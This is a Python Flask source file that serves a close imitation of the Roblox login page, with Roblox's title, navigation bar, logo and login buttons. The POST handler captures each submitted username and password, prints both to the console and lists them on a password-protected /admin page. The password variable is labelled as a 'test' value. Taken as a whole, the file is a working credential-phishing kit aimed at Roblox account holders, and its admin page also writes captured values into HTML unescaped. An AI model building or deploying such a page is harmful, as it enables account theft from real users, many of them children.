import os
from flask import Flask, request, Response, redirect

messages = []
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        username = request.form.get("Username", "")
        test_password = request.form.get("Password", "")

        messages.append({
            "username": username,
            "message": test_password
        })

        print("Username:", username)
        print("Test value:", test_password)
        return redirect("/")

    return """
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            width: 100%;
            min-height: 100%;
        }

        body {
            min-height: 100vh;
           font-family: Arial, Helvetica, sans-serif;
font-weight: 600;
            color: white;

          background-image:
    linear-gradient(rgba(0,0,0,0.42), rgba(0,0,0,0.42)),
    url("/static/background.png");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        .navbar {
            height: 48px;
            background: #17191c;
            display: flex;
            align-items: center;
            padding: 0 12px;
            border-bottom: 1px solid #373a3d;
        }

       .logo img {
    width: 45px;
    height: 45px;
    object-fit: contain;
    display: block;
}

      .nav-link {
    padding: 0 24px;
    font-size: 16px;
    font-weight: 700;
    color: #f2f2f2;
}
        .search {
            flex: 1;
            max-width: 470px;
            margin-left: 15px;
        }

        .search input {
    width: 100%;
    height: 31px;
    background: #23262a;
    border: 1px solid #666b70;
    border-radius: 7px;
    padding: 0 12px;
    color: white;

    font-family: Arial, Helvetica, sans-serif;
    font-size: 17px;
    font-weight: 600;
}

.signup {
    margin-left: auto;
    background: #0f4f87;
    padding: 7px 15px;
    border-radius: 7px;

    font-family: Arial, Helvetica, sans-serif;
    font-size: 16px;
    font-weight: 700;
}
        .main-area {
            min-height: calc(100vh - 48px);
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 105px;
        }

        .panel {
            width: 390px;
            padding: 25px 22px;
            background: #24292f;
            border-radius: 6px;
            box-shadow: 0 12px 38px rgba(0,0,0,.65);
        }

     .panel h1 {
    text-align: center;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 32px;
    font-weight: 700;
    letter-spacing: -0.6px;
    margin: 5px 0 15px;
}

       .panel input,
.panel textarea {
    width: 100%;
    background: #343a40;
    color: white;
    border: 1px solid #8f989f;
    border-radius: 7px;
    padding: 10px;
    margin-bottom: 9px;

    font-family: Arial, Helvetica, sans-serif;
    font-size: 15px;
    font-weight: 600;
}

        .panel textarea {
            height: 70px;
            resize: none;
        }

.main-button {
    width: 100%;
    height: 37px;
    background: transparent;
    color: white;
    border: 1px solid #e7e7e7;
    border-radius: 7px;

    font-family: Arial, Helvetica, sans-serif;
    font-size: 17px;
    font-weight: 700;

    cursor: pointer;
}

        .helper {
    text-align: center;
    margin-top: 18px;
    font-size: 15px;
    font-weight: 700;
}

.footer-text {
    text-align: center;
    font-size: 14px;
    font-weight: 600;
    margin-top: 15px;
    color: #d3d7da;
}
        .separator {
            border: 0;
            border-top: 1px solid #5d656d;
            margin: 23px 0 15px;
        }

       .secondary {
    width: 100%;
    background: #454d55;
    color: white;
    padding: 9px;
    border: 0;
    border-radius: 7px;

    font-family: Arial, Helvetica, sans-serif;
    font-size: 16px;
    font-weight: 700;

    margin-bottom: 9px;
}

        .footer-text {
            text-align: center;
            font-size: 13px;
            margin-top: 15px;
            color: #d3d7da;
        }
    </style>
</head>

<body>

<div class="navbar">
   <div class="logo">
    <img src="/static/logo.png" alt="Logo">
</div>
    <div class="nav-link">Home</div>
    <div class="nav-link">Charts</div>
    <div class="nav-link">Marketplace</div>
    <div class="nav-link">Create</div>

    <div class="search">
        <input type="text" placeholder="Search">
    </div>

    <div class="signup">Sign Up</div>
</div>

<div class="main-area">
    <div class="panel">

        <h1>Login to Roblox</h1>

        <form method="POST">
            <input
                name="Username"
                type="text"
                placeholder="Username/Email/Phone"
                required
            >

           <input
    name="Password"
    type="password"
    placeholder="Password"
    required
            >
            <button
    class="main-button"
    type="submit"
    >
                Log In
            </button>
        </form>

        <div class="helper">
            Forgot Password or Username?
        </div>

        <hr class="separator">

        <button class="secondary">Email me a One-Time Code</button>
        <button class="secondary">Quick Sign-in</button>

        <div class="footer-text">
            Don't have an account? Sign Up
        </div>
    </div>
</div>

</body>
</html>
"""
@app.route("/admin")
def admin():
    auth = request.authorization

    if not auth or auth.password != ADMIN_PASSWORD:
        return Response(
            "Login required",
            401,
            {"WWW-Authenticate": 'Basic realm="Admin"'}
        )

    html = """
    <html>
    <head>
        <title>Messages</title>
        <style>
            body {
                background: #111;
                color: white;
                font-family: "Segoe UI", Arial, sans-serif;
                padding: 30px;
            }

            .message {
                background: #24292f;
                padding: 15px;
                border-radius: 10px;
                margin-bottom: 12px;
            }
        </style>
    </head>
    <body>
        <h1>Messages</h1>
    """

    for item in messages:
        html += f'''
        <div class="message">
            <b>{item["username"]}</b><br>
            {item["message"]}
        </div>
        '''

    html += "</body></html>"
    return html
